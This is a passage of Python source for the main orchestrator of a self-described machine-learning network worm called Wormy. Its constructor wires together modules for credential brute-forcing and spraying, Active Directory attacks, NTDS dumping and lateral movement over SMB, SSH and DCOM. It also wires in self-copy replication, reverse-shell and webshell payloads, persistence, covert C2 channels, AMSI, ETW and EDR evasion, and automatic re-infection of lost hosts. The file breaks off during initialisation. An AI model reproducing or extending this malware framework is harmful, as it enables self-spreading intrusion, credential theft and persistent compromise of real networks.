"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
ML Network Worm - Main Core v3.0
Full integration: Professional Scanner, Knowledge Graph, RL Brain, Credential Intelligence,
Brute Force Engine, Vulnerability Scanner, Exploit Chains, Lateral Movement,
Polymorphic Evasion, C2 Server, Async Exploitation, Audit Reports, Interactive CLI
"""


"""
Wormy ML Network Worm v4.0 — Main orchestrator
"""

import time
import sys
if sys.stdout.encoding.lower() != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8')

import os
import json
import asyncio
import shlex
import threading
import traceback
import warnings
import urllib3
from typing import List, Dict, Optional, Tuple
from datetime import datetime, timedelta

# Suppress unverified HTTPS warnings for C2 communications
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from configs.config import Config

from utils.logger import logger

# Core components
from scanner import IntelligentScanner, HostClassifier
from rl_engine import PropagationAgent, RealWorldPropagationAgent

# Contextual Bandit for credential selection
try:
    from exploits.contextual_bandit import ContextualBandit
    CONTEXTUAL_BANDIT_AVAILABLE = True
except ImportError:
    CONTEXTUAL_BANDIT_AVAILABLE = False
    ContextualBandit = None

# Evasion ML model
try:
    from evasion.evasion_model import EvasionModel
    EVASION_MODEL_AVAILABLE = True
except ImportError:
    EVASION_MODEL_AVAILABLE = False
    EvasionModel = None

# Professional engines
try:
    from scanner.professional_scanner import ProfessionalScanner, ServiceDetector

    PRO_SCANNER_AVAILABLE = True
except ImportError:
    PRO_SCANNER_AVAILABLE = False
    ProfessionalScanner = None
    ServiceDetector = None

try:
    from exploits.brute_force_engine import BruteForceEngine, PasswordGenerator

    BRUTE_FORCE_AVAILABLE = True
except ImportError:
    BRUTE_FORCE_AVAILABLE = False
    BruteForceEngine = None
    PasswordGenerator = None

try:
    from exploits.exploit_engine import VulnerabilityScanner, ExploitChain

    EXPLOIT_ENGINE_AVAILABLE = True
except ImportError:
    EXPLOIT_ENGINE_AVAILABLE = False
    VulnerabilityScanner = None
    ExploitChain = None

try:
    from exploits.async_exploit import AsyncExploitDispatcher

    ASYNC_EXPLOIT_AVAILABLE = True
except ImportError:
    ASYNC_EXPLOIT_AVAILABLE = False
    AsyncExploitDispatcher = None

# New modules
try:
    from core.knowledge_graph import NetworkKnowledgeGraph

    KNOWLEDGE_GRAPH_AVAILABLE = True
except ImportError:
    KNOWLEDGE_GRAPH_AVAILABLE = False
    NetworkKnowledgeGraph = None

try:
    from post_exploit.lateral_movement import LateralMovementEngine

    LATERAL_MOVEMENT_AVAILABLE = True
except ImportError:
    LATERAL_MOVEMENT_AVAILABLE = False
    LateralMovementEngine = None

try:
    from evasion.polymorphic_engine import PolymorphicEngine

    POLYMORPHIC_AVAILABLE = True
except ImportError:
    POLYMORPHIC_AVAILABLE = False
    PolymorphicEngine = None

try:
    from utils.audit_report import AuditReportGenerator

    AUDIT_REPORT_AVAILABLE = True
except ImportError:
    AUDIT_REPORT_AVAILABLE = False
    AuditReportGenerator = None

try:
    from monitoring.cli_monitor import CLIMonitor, WormActivityBridge

    CLI_MONITOR_AVAILABLE = True
except ImportError:
    CLI_MONITOR_AVAILABLE = False
    CLIMonitor = None
    WormActivityBridge = None

# C2 Server
try:
    from c2.multi_protocol_c2 import MultiProtocolC2

    C2_AVAILABLE = True
except ImportError:
    C2_AVAILABLE = False
    MultiProtocolC2 = None

# Host Monitor
try:
    from monitoring.host_monitor import HostMonitor, HostState

    HOST_MONITOR_AVAILABLE = True
except ImportError:
    HOST_MONITOR_AVAILABLE = False
    HostMonitor = None
    HostState = None

# APT-Level Adaptive Cycle Components
try:
    from core.predictive_recon import PredictiveScanner, BayesianNetworkAnalyzer

    PREDICTIVE_RECON_AVAILABLE = True
except ImportError:
    PREDICTIVE_RECON_AVAILABLE = False
    PredictiveScanner = None
    BayesianNetworkAnalyzer = None

try:
    from exploits.adaptive_exploit_selector import AdaptiveExploitSelector

    ADAPTIVE_EXPLOIT_AVAILABLE = True
except ImportError:
    ADAPTIVE_EXPLOIT_AVAILABLE = False
    AdaptiveExploitSelector = None

try:
    from core.distributed_redundancy import DistributedRedundancy

    DISTRIBUTED_REDUNDANCY_AVAILABLE = True
except ImportError:
    DISTRIBUTED_REDUNDANCY_AVAILABLE = False
    DistributedRedundancy = None

try:
    from evasion.traffic_mimicry import TrafficMimicryEngine

    TRAFFIC_MIMICRY_AVAILABLE = True
except ImportError:
    TRAFFIC_MIMICRY_AVAILABLE = False
    TrafficMimicryEngine = None

try:
    from evasion.semantic_polymorphism import SemanticPolymorphicEngine

    SEMANTIC_POLYMORPHISM_AVAILABLE = True
except ImportError:
    SEMANTIC_POLYMORPHISM_AVAILABLE = False
    SemanticPolymorphicEngine = None

try:
    from core.dormant_cells import DormantCellManager

    DORMANT_CELLS_AVAILABLE = True
except ImportError:
    DORMANT_CELLS_AVAILABLE = False
    DormantCellManager = None

# ── Modules to connect ─────────────────────────────────────────────────────
try:
    from core.wave_propagation import SelfCopyTransfer

    SELF_COPY_AVAILABLE = True
except ImportError:
    SELF_COPY_AVAILABLE = False
    SelfCopyTransfer = None

try:
    from post_exploit.payload_deployer import PayloadDeployer

    PAYLOAD_DEPLOYER_AVAILABLE = True
except ImportError:
    PAYLOAD_DEPLOYER_AVAILABLE = False
    PayloadDeployer = None

try:
    from post_exploit.remote_persistence import PersistenceEngine

    REMOTE_PERSISTENCE_AVAILABLE = True
except ImportError:
    REMOTE_PERSISTENCE_AVAILABLE = False
    PersistenceEngine = None

try:
    from infection.enhanced_infection import InfectionEngine

    INFECTION_ENGINE_AVAILABLE = True
except ImportError:
    INFECTION_ENGINE_AVAILABLE = False
    InfectionEngine = None

try:
    from c2.cloud_c2 import CloudC2Manager
    CLOUD_C2_AVAILABLE = True
except ImportError:
    CLOUD_C2_AVAILABLE = False
    CloudC2Manager = None

try:
    from post_exploit.dcom_lateral import DCOMLateral
    DCOM_LATERAL_AVAILABLE = True
except ImportError:
    DCOM_LATERAL_AVAILABLE = False
    DCOMLateral = None

try:
    from post_exploit.vss_ntds import VSSNTDSExtractor
    VSS_NTDS_AVAILABLE = True
except ImportError:
    VSS_NTDS_AVAILABLE = False
    VSSNTDSExtractor = None

try:
    from evasion.ja3_spoof import JA3Spoofer
    JA3_SPOOF_AVAILABLE = True
except ImportError:
    JA3_SPOOF_AVAILABLE = False
    JA3Spoofer = None

try:
    from c2.icmp_tunnel import ICMPTunnel
    ICMP_TUNNEL_AVAILABLE = True
except ImportError:
    ICMP_TUNNEL_AVAILABLE = False
    ICMPTunnel = None

try:
    from evasion.direct_syscalls import DirectSyscalls
    DIRECT_SYSCALLS_AVAILABLE = True
except ImportError:
    DIRECT_SYSCALLS_AVAILABLE = False
    DirectSyscalls = None

try:
    from evasion.sleep_obfuscation import SleepObfuscator
    SLEEP_OBFUSCATOR_AVAILABLE = True
except ImportError:
    SLEEP_OBFUSCATOR_AVAILABLE = False
    SleepObfuscator = None

try:
    from monitoring.multi_operator import MultiOperatorServer
    MULTI_OPERATOR_AVAILABLE = True
except ImportError:
    MULTI_OPERATOR_AVAILABLE = False
    MultiOperatorServer = None

try:
    from utils.mitre_mapper import MITREMapper
    MITRE_MAPPER_AVAILABLE = True
except ImportError:
    MITRE_MAPPER_AVAILABLE = False
    MITREMapper = None

try:
    from core.plugin_system import PluginManager
    PLUGIN_SYSTEM_AVAILABLE = True
except ImportError:
    PLUGIN_SYSTEM_AVAILABLE = False
    PluginManager = None

try:
    from post_exploit.local_persistence import PersistenceManager, AdvancedPersistence
    LOCAL_PERSISTENCE_AVAILABLE = True
except ImportError:
    LOCAL_PERSISTENCE_AVAILABLE = False
    PersistenceManager = None
    AdvancedPersistence = None

try:
    from core.adaptive_cycle import AdaptiveCycle

    ADAPTIVE_CYCLE_AVAILABLE = True
except ImportError:
    ADAPTIVE_CYCLE_AVAILABLE = False
    AdaptiveCycle = None

# ── Swarm Coordinator ─────────────────────────────────────────────────────────
try:
    from swarm.multi_agent import SwarmCoordinator, SwarmAgent
    SWARM_AVAILABLE = True
except ImportError:
    SWARM_AVAILABLE = False
    SwarmCoordinator = None
    SwarmAgent = None

# ── Payload Manager ──────────────────────────────────────────────────────────
try:
    from payloads.payload_manager import PayloadManager
    PAYLOAD_MANAGER_AVAILABLE = True
except ImportError:
    PAYLOAD_MANAGER_AVAILABLE = False
    PayloadManager = None

# ── Fuzzing Engine ────────────────────────────────────────────────────────────
try:
    from exploits.fuzzing_engine import FuzzingEngine
    FUZZING_ENGINE_AVAILABLE = True
except ImportError:
    FUZZING_ENGINE_AVAILABLE = False
    FuzzingEngine = None

# ── PFS Crypto ────────────────────────────────────────────────────────────────
try:
    from c2.pfs_crypto import PFSCrypto
    PFS_CRYPTO_AVAILABLE = True
except ImportError:
    PFS_CRYPTO_AVAILABLE = False
    PFSCrypto = None

# Config profiles
CONFIG_PROFILES = {
    "stealth": {
        "propagation_delay": 10.0,
        "max_infections": 10,
        "stealth_mode": True,
        "randomize_timing": True,
        "max_scan_rate": 10,
        "detect_ids": True,
        "detect_honeypots": True,
        "max_runtime_hours": 8,
        "use_pretrained": True,
    },
    "aggressive": {
        "propagation_delay": 0.5,
        "max_infections": 100,
        "stealth_mode": False,
        "randomize_timing": False,
        "max_scan_rate": 500,
        "detect_ids": False,
        "detect_honeypots": False,
        "max_runtime_hours": 2,
        "use_pretrained": False,
    },
    "audit": {
        "propagation_delay": 3.0,
        "max_infections": 50,
        "stealth_mode": True,
        "randomize_timing": True,
        "max_scan_rate": 50,
        "detect_ids": True,
        "detect_honeypots": True,
        "max_runtime_hours": 4,
        "use_pretrained": True,
        "enable_logging": True,
        "log_encryption": True,
    },
}


class WormCore:
    """
    Main worm orchestrator v3.0
    Full integration of ALL modules with professional engines,
    knowledge graph, lateral movement, polymorphic evasion,
    C2 server, async exploitation, and audit reporting.
    """

    def __init__(
        self,
        config_file: str = None,
        use_cli_monitor: bool = True,
        profile: str = None,
        dry_run: bool = False,
        interactive: bool = False,
    ):
        """Initialize worm with configuration"""
        self.dry_run = dry_run
        self.interactive = interactive
        self._lock = threading.Lock()
        if dry_run:
            logger.info("[DRY RUN] No real exploits will be executed")

        # Load configuration
        self.config = Config(config_file) if config_file else Config()

        # Apply profile overrides
        if profile and profile in CONFIG_PROFILES:
            self._apply_profile(profile)

        # Auto-detect local subnet and add to allowed networks
        try:
            local_ip = get_local_ip()
            if local_ip and local_ip != "127.0.0.1":
                parts = local_ip.split(".")
                local_subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                if local_subnet not in self.config.safety.allowed_networks:
                    self.config.safety.allowed_networks.append(local_subnet)
        except Exception:
            pass

        if not self.config.validate():
            logger.critical("Invalid configuration")
            sys.exit(1)

        # Initialize CLI monitor
        self.cli_monitor = None
        self.activity_bridge = None
        if use_cli_monitor and CLI_MONITOR_AVAILABLE and not dry_run:
            self.cli_monitor = CLIMonitor()
            self.activity_bridge = WormActivityBridge(self.cli_monitor)
            self.cli_monitor.start_background(refresh_interval=1.5)

        logger.info("=" * 60)
        logger.info("WORMY ML NETWORK WORM v3.0")
        logger.info("=" * 60)
        if profile:
            logger.info(f"Profile: {profile}")
        if dry_run:
            logger.info("Mode: DRY RUN (simulation only)")
        if interactive:
            logger.info("Mode: INTERACTIVE CLI")
        logger.info(f"Target Ranges: {self.config.network.target_ranges}")
        logger.info("=" * 60)

        # Professional Scanner (with fallback to basic scanner)
        self.pro_scanner = None
        if PRO_SCANNER_AVAILABLE:
            self.pro_scanner = ProfessionalScanner(
                max_concurrency=self.config.network.max_threads,
                timeout=self.config.network.scan_timeout,
            )
            logger.info("Professional Scanner: enabled")
        self.scanner = IntelligentScanner(self.config, use_ml=True)

        # Knowledge Graph
        self.knowledge_graph = None
        if KNOWLEDGE_GRAPH_AVAILABLE:
            self.knowledge_graph = NetworkKnowledgeGraph()
            logger.info("Knowledge Graph: enabled")

        # Exploit Manager (includes CredentialManager)
        from exploits.exploit_manager import ExploitManager

        self.exploit_manager = ExploitManager(self.config)

        # Credential Manager reference
        self.cred_manager = self.exploit_manager.cred_manager

        # Brute Force Engine
        self.brute_force_engine = None
        if BRUTE_FORCE_AVAILABLE and self.cred_manager:
            self.brute_force_engine = BruteForceEngine(
                credential_manager=self.cred_manager,
                password_generator=self.exploit_manager.password_generator,
            )
            logger.info("Brute Force Engine: enabled")

        # Vulnerability Scanner + Exploit Chain
        self.vuln_scanner = None
        self.exploit_chain = None
        if EXPLOIT_ENGINE_AVAILABLE:
            self.vuln_scanner = VulnerabilityScanner()
            self.exploit_chain = ExploitChain(self.vuln_scanner)
            logger.info("Vulnerability Scanner + Exploit Chain: enabled")

        # Async Exploit Dispatcher
        self.async_dispatcher = None
        if ASYNC_EXPLOIT_AVAILABLE:
            self.async_dispatcher = AsyncExploitDispatcher(
                exploit_manager=self.exploit_manager,
                credential_manager=self.cred_manager,
                max_concurrency=5,
                target_timeout=30.0,
            )
            logger.info("Async Exploit Dispatcher: enabled")

        # Lateral Movement Engine
        self.lateral_movement = None
        if LATERAL_MOVEMENT_AVAILABLE:
            self.lateral_movement = LateralMovementEngine(self.cred_manager)
            logger.info("Lateral Movement: enabled")

        # Polymorphic Engine
        self.polymorphic_engine = None
        if POLYMORPHIC_AVAILABLE:
            self.polymorphic_engine = PolymorphicEngine(mutation_level=2)
            logger.info("Polymorphic Engine: enabled (level 2)")

        # C2 Server
        self.c2_server = None
        if C2_AVAILABLE:
            try:
                self.c2_server = MultiProtocolC2(self.config)
                logger.info("C2 Server: enabled")
            except Exception as e:
                logger.warning(f"C2 Server failed to initialize: {e}")

        # Host Monitor (with payload mutation per host)
        self.host_monitor = None
        if HOST_MONITOR_AVAILABLE:
            self.host_monitor = HostMonitor(polymorphic_engine=self.polymorphic_engine)
            logger.info("Host Monitor: enabled (payload mutation per host)")

        # Web Dashboard
        self.web_dashboard = None
        try:
            from monitoring.web_dashboard import WebDashboard

            self.web_dashboard = WebDashboard(worm_core=self, host="0.0.0.0", port=5000)
            logger.info("Web Dashboard: enabled (http://0.0.0.0:5000)")
        except Exception as e:
            logger.warning(f"Web Dashboard failed to initialize: {e}")

        # Armitage-Style Dashboard
        self.armitage_dashboard = None
        try:
            from monitoring.armitage_dashboard import ArmitageDashboard
            from training.realistic_training import RealisticTrainer

            trainer = None
            try:
                trainer = RealisticTrainer(
                    self.config.ml.rl_agent_path.replace(".h5", "")
                )
            except Exception:
                pass
            self.armitage_dashboard = ArmitageDashboard(
                worm_core=self, trainer=trainer, host="0.0.0.0", port=5001
            )
            logger.info("Armitage Dashboard: enabled (http://0.0.0.0:5001)")
        except Exception as e:
            logger.warning(f"Armitage Dashboard failed to initialize: {e}")

        # Evasion modules (legacy)
        from evasion.ids_detector import IDSDetector
        from evasion.stealth_engine import StealthEngine
        from evasion.ids_evasion import IDSEvasionEngine
        from evasion.anti_forensics import AntiForensics
        from evasion.edr_bypass import EDRBypass
        from evasion.memory_execution import MemoryExecution

        self.ids_detector = IDSDetector(self.config)
        self.stealth_engine = StealthEngine(self.config)
        self.ids_evasion = IDSEvasionEngine(self.config)
        self.anti_forensics = AntiForensics()
        self.edr_bypass = EDRBypass()
        self.memory_execution = MemoryExecution()

        # ── Enterprise Evasion Engine v2 ──────────────────────────────────────
        self.enterprise_evasion = None
        try:
            from evasion.enterprise_evasion import EnterpriseEvasionEngine
            self.enterprise_evasion = EnterpriseEvasionEngine()
            # Apply AMSI/ETW/DLL-unhook at startup (Windows) — sandbox bail-out
            evasion_results = self.enterprise_evasion.apply_all(bail_on_sandbox=True)
            active = [k for k, v in evasion_results.items() if v is True]
            logger.info(f"Enterprise Evasion v2: {active if active else 'platform-limited (non-Windows)'}")
        except Exception as e:
            logger.warning(f"Enterprise Evasion v2 failed to init: {e}")

        # ── Enterprise Password Engine ─────────────────────────────────────────
        self.enterprise_password_engine = None
        try:
            from exploits.enterprise_password_engine import EnterprisePasswordEngine
            self.enterprise_password_engine = EnterprisePasswordEngine(
                max_workers=20, lockout_threshold=5
            )
            logger.info("Enterprise Password Engine: enabled (spray + brute + stuffing + mutations)")
        except Exception as e:
            logger.warning(f"Enterprise Password Engine failed: {e}")

        # ── Enterprise Scanner ────────────────────────────────────────────────
        self.enterprise_scanner = None
        try:
            from scanner.enterprise_scanner import EnterpriseScanner
            self.enterprise_scanner = EnterpriseScanner(
                max_workers=min(100, self.config.network.max_threads * 2),
                timeout=self.config.network.scan_timeout,
            )
            logger.info("Enterprise Scanner v2: enabled (TCP-probe, banner-grab, asset-classify)")
        except Exception as e:
            logger.warning(f"Enterprise Scanner v2 failed: {e}")

        # ── Active Directory Attacker ─────────────────────────────────────────
        self.ad_attacker = None
        try:
            from exploits.active_directory import ActiveDirectoryAttacker
            self.ad_attacker = ActiveDirectoryAttacker()
            logger.info("Active Directory Attacker: enabled (LDAP enum, AS-REP, Kerberoast)")
        except Exception as e:
            logger.warning(f"AD Attacker failed: {e}")

        # ── Resilient C2 Engine v2 ────────────────────────────────────────────
        self.resilient_c2 = None
        try:
            from c2.resilient_c2 import ResilientC2Engine
            self.resilient_c2 = ResilientC2Engine(config=self.config)
            self.resilient_c2.start(start_p2p=True)
            logger.info("Resilient C2 v2: enabled (DoH + DomainFronting + P2P + CommandQueue)")
        except Exception as e:
            logger.warning(f"Resilient C2 v2 failed: {e}")

        # ── Advanced Polymorphic Engine v2 ───────────────────────────────────
        self.advanced_polymorphic = None
        try:
            from evasion.advanced_polymorphic import AdvancedPolymorphicEngine
            self.advanced_polymorphic = AdvancedPolymorphicEngine(mutation_level=3)
            logger.info("Advanced Polymorphic v2: enabled (AST-metamorphic, semantic NOPs, net-fingerprint)")
        except Exception as e:
            logger.warning(f"Advanced Polymorphic v2 failed: {e}")

        # ── Wave Propagation Engine ───────────────────────────────────────────
        self.wave_propagation = None
        try:
            from core.wave_propagation import WavePropagationEngine
            self.wave_propagation = WavePropagationEngine(
                max_waves=3,
                max_workers=min(20, self.config.network.max_threads),
            )
            logger.info("Wave Propagation v2: enabled (pivot-scan, SMB/SSH self-copy, propagation-graph)")
        except Exception as e:
            logger.warning(f"Wave Propagation v2 failed: {e}")

        # ── Agent Controller ──────────────────────────────────────────────────
        self.agent_controller = None
        try:
            from core.agent_controller import AgentController
            self.agent_controller = AgentController(
                heartbeat_interval=60,
                stale_threshold=600,
                max_workers=20,
            )
            # When an agent dies, try to re-infect it automatically
            def _on_dead(agent_session):
                target = {
                    "ip": agent_session.ip,
                    "open_ports": [22, 445],
                    "asset_value": agent_session.asset_value,
                }
                logger.warning(f"Agent {agent_session.ip} dead — queuing re-infection")
                self.exploit_queue.put(target) if hasattr(self, 'exploit_queue') else None

            self.agent_controller.start_heartbeat_monitor(on_dead_agent=_on_dead)
            logger.info("Agent Controller v2: enabled (heartbeat, SSH pool, task queue, intel harvest)")
        except Exception as e:
            logger.warning(f"Agent Controller v2 failed: {e}")

        # ── Advanced Self-Healing Engine v2 ──────────────────────────────────
        self.advanced_self_healing = None
        try:
            from core.advanced_self_healing import AdvancedSelfHealingEngine
            self.advanced_self_healing = AdvancedSelfHealingEngine(
                config=self.config,
                payload_path=os.path.abspath(__file__),
            )
            self.advanced_self_healing.start(check_interval=120, launch_guardian=False)
            logger.info("Advanced Self-Healing v2: enabled (integrity-check, re-persist, watchdog, cleanup)")
        except Exception as e:
            logger.warning(f"Advanced Self-Healing v2 failed: {e}")

        # APT-Level Adaptive Cycle Components
        self.adaptive_cycle = None
        if ADAPTIVE_CYCLE_AVAILABLE:
            try:
                local_ip = get_local_ip()
                self.adaptive_cycle = AdaptiveCycle(
                    host_ip=local_ip,
                    host_id="wormy_main",
                )
                logger.info("Adaptive Cycle: enabled (APT-Level)")
            except Exception as e:
                logger.warning(f"Adaptive Cycle failed to initialize: {e}")

        # Individual APT components (for granular control)
        self.predictive_scanner = None
        if PREDICTIVE_RECON_AVAILABLE:
            self.predictive_scanner = PredictiveScanner()
            logger.info("Predictive Reconnaissance: enabled")

        self.adaptive_exploit_selector = None
        if ADAPTIVE_EXPLOIT_AVAILABLE:
            self.adaptive_exploit_selector = AdaptiveExploitSelector()
            logger.info("Adaptive Exploit Selector: enabled (Thompson Sampling)")

        self.distributed_redundancy = None
        if DISTRIBUTED_REDUNDANCY_AVAILABLE:
            try:
                local_ip = get_local_ip()
                self.distributed_redundancy = DistributedRedundancy(
                    host_ip=local_ip, host_id="wormy_main"
                )
                logger.info("Distributed Redundancy: enabled (P2P healing mesh)")
            except Exception as e:
                logger.warning(f"Distributed Redundancy failed: {e}")

        self.traffic_mimicry = None
        if TRAFFIC_MIMICRY_AVAILABLE:
            self.traffic_mimicry = TrafficMimicryEngine()
            logger.info("Traffic Mimicry: enabled (protocol tunneling)")

        self.semantic_polymorphism = None
        if SEMANTIC_POLYMORPHISM_AVAILABLE:
            self.semantic_polymorphism = SemanticPolymorphicEngine()
            logger.info("Semantic Polymorphism: enabled (AST manipulation)")

        self.dormant_cells = None
        if DORMANT_CELLS_AVAILABLE:
            self.dormant_cells = DormantCellManager()
            logger.info("Dormant Cells: enabled (staged loading)")

        # ── Self-Copy Transfer ────────────────────────────────────────────────
        self.self_copy = None
        if SELF_COPY_AVAILABLE:
            self.self_copy = SelfCopyTransfer()
            logger.info("Self-Copy Transfer: enabled (SSH/SMB worm replication)")

        # ── Payload Deployer ──────────────────────────────────────────────────
        self.payload_deployer = None
        if PAYLOAD_DEPLOYER_AVAILABLE:
            self.payload_deployer = PayloadDeployer()
            logger.info("Payload Deployer: enabled (reverse shell, beacon, webshell)")

        # ── Remote Persistence Engine ─────────────────────────────────────────
        self.remote_persistence = None
        if REMOTE_PERSISTENCE_AVAILABLE:
            self.remote_persistence = PersistenceEngine()
            logger.info("Remote Persistence Engine: enabled (cron, systemd, registry, SSH keys)")

        # ── Infection Engine ──────────────────────────────────────────────────
        self.infection_engine = None
        if INFECTION_ENGINE_AVAILABLE:
            self.infection_engine = InfectionEngine()
            logger.info("Infection Engine: enabled (7-vector infection, backdoors, persistence)")

        # ── Cloud C2 Manager ──────────────────────────────────────────────────
        self.cloud_c2 = None
        if CLOUD_C2_AVAILABLE:
            try:
                self.cloud_c2 = CloudC2Manager()
                logger.info("Cloud C2 Manager: enabled (Telegram/Slack/Sheets)")
            except Exception as e:
                logger.warning(f"Cloud C2 Manager failed: {e}")

        # ── DCOM Lateral Movement ────────────────────────────────────────────
        self.dcom_lateral = None
        if DCOM_LATERAL_AVAILABLE:
            try:
                self.dcom_lateral = DCOMLateral()
                logger.info("DCOM Lateral Movement: enabled")
            except Exception as e:
                logger.warning(f"DCOM Lateral Movement failed: {e}")

        # ── VSS NTDS Extractor ───────────────────────────────────────────────
        self.vss_ntds = None
        if VSS_NTDS_AVAILABLE:
            try:
                self.vss_ntds = VSSNTDSExtractor(output_dir="saved/ntds_dumps")
                logger.info("VSS NTDS Extractor: enabled")
            except Exception as e:
                logger.warning(f"VSS NTDS Extractor failed: {e}")

        # ── JA3 Spoofer ──────────────────────────────────────────────────────
        self.ja3_spoofer = None
        if JA3_SPOOF_AVAILABLE:
            try:
                self.ja3_spoofer = JA3Spoofer(profile="chrome_120")
                logger.info("JA3 Spoofer: enabled (Chrome 120 fingerprint)")
            except Exception as e:
                logger.warning(f"JA3 Spoofer failed: {e}")

        # ── ICMP Tunnel ──────────────────────────────────────────────────────
        self.icmp_tunnel = None
        if ICMP_TUNNEL_AVAILABLE:
            try:
                local_ip = get_local_ip()
                self.icmp_tunnel = ICMPTunnel(c2_ip=local_ip)
                logger.info("ICMP Tunnel: enabled")
            except Exception as e:
                logger.warning(f"ICMP Tunnel failed: {e}")

        # ── Direct Syscalls ──────────────────────────────────────────────────
        self.direct_syscalls = None
        if DIRECT_SYSCALLS_AVAILABLE:
            try:
                self.direct_syscalls = DirectSyscalls()
                logger.info("Direct Syscalls: enabled (NT syscall invocation)")
            except Exception as e:
                logger.warning(f"Direct Syscalls failed: {e}")

        # ── Sleep Obfuscator ─────────────────────────────────────────────────
        self.sleep_obfuscator = None
        if SLEEP_OBFUSCATOR_AVAILABLE:
            try:
                self.sleep_obfuscator = SleepObfuscator()
                logger.info("Sleep Obfuscator: enabled (Ekko-style sleep masking)")
            except Exception as e:
                logger.warning(f"Sleep Obfuscator failed: {e}")

        # ── Multi-Operator Server ────────────────────────────────────────────
        self.multi_operator = None
        if MULTI_OPERATOR_AVAILABLE:
            try:
                self.multi_operator = MultiOperatorServer(
                    host="0.0.0.0", port=8444,
                    jwt_secret="wormy_jwt_secret_change_me",
                    db_path="saved/operators.db",
                )
                logger.info("Multi-Operator Server: enabled (port 8444)")
            except Exception as e:
                logger.warning(f"Multi-Operator Server failed: {e}")

        # ── MITRE ATT&CK Mapper ──────────────────────────────────────────────
        self.mitre_mapper = None
        if MITRE_MAPPER_AVAILABLE:
            try:
                self.mitre_mapper = MITREMapper(operation_name="Wormy Operation")
                logger.info("MITRE ATT&CK Mapper: enabled")
            except Exception as e:
                logger.warning(f"MITRE ATT&CK Mapper failed: {e}")

        # ── Plugin System ────────────────────────────────────────────────────
        self.plugin_manager = None
        if PLUGIN_SYSTEM_AVAILABLE:
            try:
                self.plugin_manager = PluginManager()
                discovered = self.plugin_manager.discover_plugins()
                logger.info(f"Plugin System: enabled ({len(discovered)} plugins discovered)")
            except Exception as e:
                logger.warning(f"Plugin System failed: {e}")

        # ── Local Persistence ────────────────────────────────────────────────
        self.local_persistence = None
        self.advanced_persistence = None
        if LOCAL_PERSISTENCE_AVAILABLE:
            try:
                self.local_persistence = PersistenceManager()
                self.advanced_persistence = AdvancedPersistence()
                logger.info("Local Persistence: enabled (run key, cron, systemd, etc.)")
            except Exception as e:
                logger.warning(f"Local Persistence failed: {e}")

        # ── Host Classifier (ML-based) ───────────────────────────────────────
        self.host_classifier = None
        try:
            classifier_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                "ml_models", "saved", "host_classifier.pkl"
            )
            self.host_classifier = HostClassifier(model_path=classifier_path)
            logger.info("Host Classifier: enabled (Random Forest, 7 classes)")
        except Exception as e:
            logger.warning(f"Host Classifier failed: {e}")

        # ── Evasion Model (ML-based detection predictor) ─────────────────────
        self.evasion_model = None
        if EVASION_MODEL_AVAILABLE:
            try:
                ev_model_path = os.path.join(
                    os.path.dirname(os.path.abspath(__file__)),
                    "ml_models", "saved", "evasion_model.pkl"
                )
                self.evasion_model = EvasionModel(model_path=ev_model_path)
                logger.info("Evasion Model: enabled (detection probability prediction)")
            except Exception as e:
                logger.warning(f"Evasion Model failed: {e}")

        # ── Contextual Bandit for credential selection ───────────────────────
        self.contextual_bandit = None
        if CONTEXTUAL_BANDIT_AVAILABLE:
            try:
                self.contextual_bandit = ContextualBandit(alpha=0.3)
                logger.info("Contextual Bandit: enabled (LinUCB credential selection)")
            except Exception as e:
                logger.warning(f"Contextual Bandit failed: {e}")

        # ── Swarm Coordinator ─────────────────────────────────────────────────
        self.swarm_coordinator = None
        self.swarm_agent = None
        if SWARM_AVAILABLE:
            try:
                self.swarm_coordinator = SwarmCoordinator()
                self.swarm_agent = SwarmAgent(role="coordinator")
                self.swarm_coordinator.register_agent(self.swarm_agent)
                logger.info("Swarm Coordinator: enabled (multi-agent intelligence)")
            except Exception as e:
                logger.warning(f"Swarm Coordinator failed: {e}")

        # ── Payload Manager ──────────────────────────────────────────────────
        self.payload_manager = None
        if PAYLOAD_MANAGER_AVAILABLE:
            try:
                c2_host = self.config.c2.c2_server
                c2_port = self.config.c2.c2_port
                self.payload_manager = PayloadManager(c2_server=c2_host, c2_port=c2_port)
                logger.info("Payload Manager: enabled (specialized payload deployment)")
            except Exception as e:
                logger.warning(f"Payload Manager failed: {e}")

        # ── Fuzzing Engine ───────────────────────────────────────────────────
        self.fuzzing_engine = None
        if FUZZING_ENGINE_AVAILABLE:
            try:
                self.fuzzing_engine = FuzzingEngine(timeout=5.0)
                logger.info("Fuzzing Engine: enabled (protocol fuzzing)")
            except Exception as e:
                logger.warning(f"Fuzzing Engine failed: {e}")

        # ── PFS Crypto ───────────────────────────────────────────────────────
        self.pfs_crypto = None
        if PFS_CRYPTO_AVAILABLE:
            try:
                self.pfs_crypto = PFSCrypto()
                logger.info("PFS Crypto: enabled (Perfect Forward Secrecy)")
            except Exception as e:
                logger.warning(f"PFS Crypto failed: {e}")

        # RL Agent - Auto-training if no model exists
        state_size = 300  # 20 hosts * 15 features
        action_size = 50
        self.rl_agent = PropagationAgent(state_size, action_size, use_dqn=True)

        # Try to load pre-trained model
        model_loaded = False
        if self.config.ml.use_pretrained and os.path.exists(
            self.config.ml.rl_agent_path
        ):
            try:
                self.rl_agent.load(self.config.ml.rl_agent_path)
                logger.info("Pretrained RL model loaded")
                model_loaded = True
            except Exception as e:
                logger.warning(f"Failed to load pretrained model: {e}")

        # Auto-train if no model exists
        if not model_loaded and self.config.ml.use_pretrained:
            try:
                from training.realistic_training import (
                    auto_train_if_needed,
                    RealisticTrainer,
                )

                save_dir = self.config.ml.rl_agent_path
                # Handle both file path and directory
                if save_dir.endswith((".h5", ".zip", ".pt")):
                    save_dir = os.path.dirname(save_dir)
                if not save_dir:
                    save_dir = "saved/rl_agent"
                trainer = RealisticTrainer(save_dir)

                if trainer.needs_training():
                    logger.info(
                        "No pre-trained model found. Starting auto-training on realistic scenarios..."
                    )
                    logger.info(
                        "Scenarios: small_office → enterprise → datacenter → cloud → iot"
                    )
                    logger.info("This may take a few minutes...")
                    auto_train_if_needed(save_dir)

                # Load the trained model
                if os.path.exists(trainer.best_model_path):
                    self.rl_agent.load(trainer.best_model_path)
